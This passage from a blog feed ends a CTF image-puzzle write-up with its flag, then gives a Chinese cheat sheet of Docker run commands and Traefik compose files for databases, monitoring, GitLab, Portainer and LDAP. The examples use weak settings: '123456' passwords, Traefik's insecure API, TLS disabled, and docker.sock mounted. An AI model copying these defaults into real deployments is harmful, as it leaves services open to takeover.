im2.size size = im2.size print(size) print(im.mode) data = [x for x in im.getdata()] for index,x in enumerate(im2.getdata()): if x and data[index]: data[index] = 255 else: data[index] = 0 im = Image.new(&#39;1&#39;,size) im.putdata(data) im.save(&#39;ans.png&#39;) flag:TMUCTF&#123;W3_h0p3_y0u_3nj0y_7h15_c0mp371710n_4nd_7h4nk_y0u!&#125;","date_published":"2021-09-18T08:56:00.000Z","tags":["CTF","CTF","TMUCTF"]},{"id":"https://zhaoqi.vip/posts/docker/","url":"https://zhaoqi.vip/posts/docker/","title":"常用Docker容器启动命令","content_html":"<h1 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h1><h2 id=\"关系型数据库\"><a href=\"#关系型数据库\" class=\"headerlink\" title=\"关系型数据库\"></a>关系型数据库</h2><h3 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run  -p 3306:3306 --name mysql \\</span><br><span class=\"line\">    -v <span class=\"string\">&quot;<span class=\"subst\">$(pwd)</span>/mysql&quot;</span>:/var/lib/mysql \\</span><br><span class=\"line\">    -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Postgres\"><a href=\"#Postgres\" class=\"headerlink\" title=\"Postgres\"></a>Postgres</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run  --name postgres \\</span><br><span class=\"line\">    -v <span class=\"string\">&quot;<span class=\"subst\">$(pwd)</span>/postgres&quot;</span>:/var/lib/postgresql/data \\</span><br><span class=\"line\">    -e POSTGRES_PASSWORD=123456 \\</span><br><span class=\"line\">    -p 5432:5432 -d postgres</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<h3 id=\"PgAdmin\"><a href=\"#PgAdmin\" class=\"headerlink\" title=\"PgAdmin\"></a>PgAdmin</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -p 8080:80  --name=pgadmin  \\</span><br><span class=\"line\">    -e <span class=\"string\">&quot;PGADMIN_DEFAULT_EMAIL=admin@zhaoqi.vip&quot;</span> \\</span><br><span class=\"line\">    -e <span class=\"string\">&quot;PGADMIN_DEFAULT_PASSWORD=123456&quot;</span>  -d dpage/pgadmin4</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"时序数据库\"><a href=\"#时序数据库\" class=\"headerlink\" title=\"时序数据库\"></a>时序数据库</h2><h3 id=\"Prometheus\"><a href=\"#Prometheus\" class=\"headerlink\" title=\"Prometheus\"></a>Prometheus</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name=prometheus -p 9090:9090 \\</span><br><span class=\"line\">    -v <span class=\"variable\">$PWD</span>/prometheus:/etc/prometheus \\</span><br><span class=\"line\">    prom/prometheus</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"InfluxDB\"><a href=\"#InfluxDB\" class=\"headerlink\" title=\"InfluxDB\"></a>InfluxDB</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 8086:8086 --name influxdb  \\</span><br><span class=\"line\">    -v <span class=\"variable\">$PWD</span>/influxdb:/var/lib/influxdb  influxdb</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"OpenTSDB\"><a href=\"#OpenTSDB\" class=\"headerlink\" title=\"OpenTSDB\"></a>OpenTSDB</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name opentsdb -dp 4242:4242 petergrace/opentsdb-docker</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"DevOps\"><a href=\"#DevOps\" class=\"headerlink\" title=\"DevOps\"></a>DevOps</h1><h2 id=\"监控\"><a href=\"#监控\" class=\"headerlink\" title=\"监控\"></a>监控</h2><h3 id=\"Cadvisor\"><a href=\"#Cadvisor\" class=\"headerlink\" title=\"Cadvisor\"></a>Cadvisor</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --volume=/:/rootfs:ro \\</span><br><span class=\"line\">    --volume=/var/run:/var/run:ro \\</span><br><span class=\"line\">    --volume=/sys:/sys:ro \\</span><br><span class=\"line\">    --volume=/var/lib/docker/:/var/lib/docker:ro \\</span><br><span class=\"line\">    --volume=/dev/disk/:/dev/disk:ro \\</span><br><span class=\"line\">    --publish=8080:8080  --detach=<span class=\"literal\">true</span>  --name=cadvisor \\</span><br><span class=\"line\">    google/cadvisor:latest</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"node-exporter\"><a href=\"#node-exporter\" class=\"headerlink\" title=\"node_exporter\"></a>node_exporter</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d \\</span><br><span class=\"line\">  -p 9100:9100 \\</span><br><span class=\"line\">  --name node-exporter \\</span><br><span class=\"line\">  --pid=<span class=\"string\">&quot;host&quot;</span> \\</span><br><span class=\"line\">  -v <span class=\"string\">&quot;/:/host:ro,rslave&quot;</span> \\</span><br><span class=\"line\">  prom/node-exporter:latest \\</span><br><span class=\"line\">  --path.rootfs=/host</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Grafana\"><a href=\"#Grafana\" class=\"headerlink\" title=\"Grafana\"></a>Grafana</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3000:3000 --name grafana \\</span><br><span class=\"line\">    -v <span class=\"variable\">$PWD</span>/grafana:/var/lib/grafana \\</span><br><span class=\"line\">    -v <span class=\"variable\">$PWD</span>/grafana/etc:/etc/grafana grafana/grafana</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a>Git</h2><h3 id=\"Gitlab\"><a href=\"#Gitlab\" class=\"headerlink\" title=\"Gitlab\"></a>Gitlab</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d  -p 8001:8001 -p 222:22 --name gitlab   \\</span><br><span class=\"line\">    -v <span class=\"string\">&quot;<span class=\"subst\">$(pwd)</span>/gitlab/config&quot;</span>:/etc/gitlab \\</span><br><span class=\"line\">    -v <span class=\"string\">&quot;<span class=\"subst\">$(pwd)</span>/gitlab/logs&quot;</span>:/var/log/gitlab \\</span><br><span class=\"line\">    -v <span class=\"string\">&quot;<span class=\"subst\">$(pwd)</span>/gitlab/data&quot;</span>:/var/opt/gitlab \\</span><br><span class=\"line\">    --restart=always gitlab/gitlab-ce</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Docker\"><a href=\"#Docker\" class=\"headerlink\" title=\"Docker\"></a>Docker</h2><h3 id=\"Portainer-docs\"><a href=\"#Portainer-docs\" class=\"headerlink\" title=\"Portainer [docs]\"></a>Portainer [<a href=\"https://documentation.portainer.io/v2.0/deploy/ceinstalldocker\">docs</a>]</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -p 9000:9000 -p 8000:8008 --name portainer \\</span><br><span class=\"line\">-v /var/run/docker.sock:/var/run/docker.sock \\</span><br><span class=\"line\">-v &quot;$(pwd)/portainer&quot;/data:/data \\</span><br><span class=\"line\">-d portainer/portainer-ce \\</span><br><span class=\"line\">--tunnel-port 8008 # 默认8000</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><h3 id=\"hoppscotch-postwoman\"><a href=\"#hoppscotch-postwoman\" class=\"headerlink\" title=\"hoppscotch(postwoman)\"></a>hoppscotch(postwoman)</h3><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -p <span class=\"number\">3000</span><span class=\"punctuation\">:</span><span class=\"number\">3000</span> hoppscotch/hoppscotch<span class=\"punctuation\">:</span>latest</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><h2 id=\"LDAP\"><a href=\"#LDAP\" class=\"headerlink\" title=\"LDAP\"></a>LDAP</h2><h3 id=\"ldap\"><a href=\"#ldap\" class=\"headerlink\" title=\"ldap\"></a>ldap</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 389:389 \\</span><br><span class=\"line\">    -v <span class=\"variable\">$PWD</span>/ldap/ldap:/var/lib/ldap \\</span><br><span class=\"line\">    -v <span class=\"variable\">$PWD</span>/ldap/slapd.d:/etc/ldap/slapd.d \\</span><br><span class=\"line\">    --name ldap \\</span><br><span class=\"line\">    --<span class=\"built_in\">env</span> LDAP_TLS=<span class=\"literal\">false</span> \\</span><br><span class=\"line\">    --<span class=\"built_in\">env</span> LDAP_ORGANISATION=<span class=\"string\">&quot;zhaoqi&quot;</span> \\</span><br><span class=\"line\">    --<span class=\"built_in\">env</span> LDAP_DOMAIN=<span class=\"string\">&quot;zhaoqi.vip&quot;</span> \\</span><br><span class=\"line\">    --<span class=\"built_in\">env</span> LDAP_ADMIN_PASSWORD=<span class=\"string\">&quot;123456&quot;</span> \\</span><br><span class=\"line\">    --<span class=\"built_in\">env</span> LDAP_CONFIG_PASSWORD=<span class=\"string\">&quot;123456&quot;</span> \\</span><br><span class=\"line\">    --restart=always osixia/openldap</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"phpldapadmin\"><a href=\"#phpldapadmin\" class=\"headerlink\" title=\"phpldapadmin\"></a>phpldapadmin</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -dit -p 19999:80 \\</span><br><span class=\"line\">    --<span class=\"built_in\">link</span> ldap \\</span><br><span class=\"line\">    --name ldap_mgr \\</span><br><span class=\"line\">    --<span class=\"built_in\">env</span> PHPLDAPADMIN_HTTPS=<span class=\"literal\">false</span> \\</span><br><span class=\"line\">    --<span class=\"built_in\">env</span> PHPLDAPADMIN_LDAP_HOSTS=ldap \\</span><br><span class=\"line\">    --restart=always osixia/phpldapadmin</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"搭配Traefik\"><a href=\"#搭配Traefik\" class=\"headerlink\" title=\"搭配Traefik\"></a>搭配Traefik</h1><h2 id=\"Traefik\"><a href=\"#Traefik\" class=\"headerlink\" title=\"Traefik\"></a>Traefik</h2><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&#x27;3&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">reverse-proxy:</span></span><br><span class=\"line\">    <span class=\"comment\"># The official v2 Traefik docker image</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">traefik</span></span><br><span class=\"line\">    <span class=\"comment\"># Enables the web UI and tells Traefik to listen to docker</span></span><br><span class=\"line\">    <span class=\"attr\">command:</span> <span class=\"string\">--api.insecure=true</span> <span class=\"string\">--providers.docker</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"comment\"># The HTTP port</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;80:80&quot;</span></span><br><span class=\"line\">      <span class=\"comment\"># The Web UI (enabled by --api.insecure=true)</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;8080:8080&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"comment\"># So that Traefik can listen to the Docker events</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">      <span class=\"comment\"># Frontend</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.enable=true&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.traefik.rule=Host(`traefik.cloud.tencent.com`)&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.services.traefik.loadbalancer.server.port=8080&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Route\"><a href=\"#Route\" class=\"headerlink\" title=\"Route\"></a>Route</h2><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&#x27;3&#x27;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">portainer:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">portainer/portainer-ce:2.9.3</span></span><br><span class=\"line\">    <span class=\"comment\">#command: -H unix:///var/run/docker.sock</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./portainer:/data</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">      <span class=\"comment\"># Frontend</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.enable=true&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.frontend.rule=Host(`portainer.cloud.tencent.com`)&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.services.frontend.loadbalancer.server.port=9000&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.frontend.service=frontend&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\"># Edge</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.edge.rule=Host(`portainer.cloud.tencent.com`)&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.services.edge.loadbalancer.server.port=8000&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.edge.service=edge&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">cadvisor:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">google/cadvisor:latest</span></span><br><span class=\"line\">    <span class=\"attr\">container_name:</span> <span class=\"string\">cadvisor</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/:/rootfs:ro</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/var/run:/var/run:rw</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/sys:/sys:ro</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/var/lib/docker/:/var/lib/docker:ro</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.enable=true&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.cadvisor.rule=Host(`cadvisor.cloud.tencent.com`)&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.services.cadvisor.loadbalancer.server.port=8080&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">prometheus:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">prom/prometheus</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./prometheus:/etc/prometheus</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.enable=true&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.prometheus.rule=Host(`prometheus.cloud.tencent.com`)&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.services.prometheus.loadbalancer.server.port=9090&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">extra_hosts:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;cadvisor.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;node-exporter.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">influxdb:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">influxdb</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./influxdb:/var/lib/influxdb</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.enable=true&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.influxdb.rule=Host(`influxdb.cloud.tencent.com`)&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.services.influxdb.loadbalancer.server.port=8086&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">extra_hosts:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;influxdb.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">grafana:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">grafana/grafana</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">./grafana:/var/lib/grafana</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.enable=true&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.grafana.rule=Host(`grafana.cloud.tencent.com`)&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.services.grafana.loadbalancer.server.port=3000&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">extra_hosts:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;influxdb.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">node-exporter:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">prom/node-exporter</span></span><br><span class=\"line\">    <span class=\"attr\">container_name:</span> <span class=\"string\">node-exporter</span></span><br><span class=\"line\">    <span class=\"attr\">command:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&#x27;--path.rootfs=/host&#x27;</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&#x27;/:/host:ro,rslave&#x27;</span></span><br><span class=\"line\">    <span class=\"attr\">pid:</span> <span class=\"string\">host</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.enable=true&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.routers.node-exporter.rule=Host(`node-exporter.cloud.tencent.com`)&quot;</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;traefik.http.services.node-exporter.loadbalancer.server.port=9100&quot;</span></span><br></pre></td></tr></table></figure><link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"数据库关系型数据库MySQL123docker run -p 3306:3306 --name mysql \\ -v &quot;$(pwd)/mysql&quot;:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 Postgres1234docker run --name postgres \\ -v &quot;$(pwd)/postgres&quot;:/var/lib/postgresql/data \\ -e POSTGRES_PASSWORD=123456 \\ -p 5432:5432 -d postgres PgAdmin123docker run -p 8080:80 --name=pgadmin \\ -e &quot;PGADMIN_DEFAULT_EMAIL=admin@zhaoqi.vip&quot; \\ -e &quot;PGADMIN_DEFAULT_PASSWORD=123456&quot; -d dpage/pgadmin4 时序数据库Prometheus123docker run -d --name=prometheus -p 9090:9090 \\ -v $PWD/prometheus:/etc/prometheus \\ prom/prometheus InfluxDB12docker run -d -p 8086:8086 --name influxdb \\ -v $PWD/influxdb:/var/lib/influxdb influxdb OpenTSDB1docker run --name opentsdb -dp 4242:4242 petergrace/opentsdb-docker DevOps监控Cadvisor1234567docker run -d --volume=/:/rootfs:ro \\ --volume=/var/run:/var/run:ro \\ --volume=/sys:/sys:ro \\ --volume=/var/lib/docker/:/var/lib/docker:ro \\ --volume=/dev/disk/:/dev/disk:ro \\ --publish=8080:8080 --detach=true --name=cadvisor \\ google/cadvisor:latest node_exporter1234567docker run -d \\ -p 9100:9100 \\ --name node-exporter \\ --pid=&quot;host&quot; \\ -v &quot;/:/host:ro,rslave&quot; \\ prom/node-exporter:latest \\ --path.rootfs=/host Grafana123docker run -d -p 3000:3000 --name grafana \\ -v $PWD/grafana:/var/lib/grafana \\ -v $PWD/grafana/etc:/etc/grafana grafana/grafana GitGitlab12345docker run -d -p 8001:8001 -p 222:22 --name gitlab \\ -v &quot;$(pwd)/gitlab/config&quot;:/etc/gitlab \\ -v &quot;$(pwd)/gitlab/logs&quot;:/var/log/gitlab \\ -v &quot;$(pwd)/gitlab/data&quot;:/var/opt/gitlab \\ --restart=always gitlab/gitlab-ce DockerPortainer [docs]12345docker run -p 9000:9000 -p 8000:8008 --name portainer \\-v /var/run/docker.sock:/var/run/docker.sock \\-v &quot;$(pwd)/portainer&quot;/data:/data \\-d portainer/portainer-ce \\--tunnel-port 8008 # 默认8000 工具测试hoppscotch(postwoman)1docker run -p 3000:3000 hoppscotch/hoppscotch:latest 其他LDAPldap12345678910docker run -d -p 389:389 \\ -v $PWD/ldap/ldap:/var/lib/ldap \\ -v $PWD/ldap/slapd.d:/etc/ldap/slapd.d \\ --name ldap \\ --env LDAP_TLS=false \\ --env LDAP_ORGANISATION=&quot;zhaoqi&quot; \\ --env LDAP_DOMAIN=&quot;zhaoqi.vip&quot; \\ --env LDAP_ADMIN_PASSWORD=&quot;123456&quot; \\ --env LDAP_CONFIG_PASSWORD=&quot;123456&quot; \\ --restart=always osixia/openldap phpldapadmin123456docker run -dit -p 19999:80 \\ --link ldap \\ --name ldap_mgr \\ --env PHPLDAPADMIN_HTTPS=false \\ --env PHPLDAPADMIN_LDAP_HOSTS=ldap \\ --restart=always osixia/phpldapadmin 搭配TraefikTraefik123456789101112131415161718192021version: &#x27;3&#x27;services: reverse-proxy: # The official v2 Traefik docker image image: traefik # Enables the web UI and tells Traefik to listen to docker command: --api.insecure=true --providers.docker ports: # The HTTP port - &quot;80:80&quot; # The Web UI (enabled by --api.insecure=true) - &quot;8080:8080&quot; volumes: # So that Traefik can listen to the Docker events - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; labels: # Frontend - &quot;traefik.enable=true&quot; - &quot;traefik.http.routers.traefik.rule=Host(`traefik.cloud.tencent.com`)&quot; - &quot;traefik.http.services.traefik.loadbalancer.server.port=8080&quot; Route1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677version: &#x27;3&#x27;services: portainer: image: portainer/portainer-ce:2.9.3 #command: -H unix:///var/run/docker.sock volumes: - /var/run/docker.sock:/var/run/docker.sock - ./portainer:/data labels: # Frontend - &quot;traefik.enable=true&quot; - &quot;traefik.http.routers.frontend.rule=Host(`portainer.cloud.tencent.com`)&quot; - 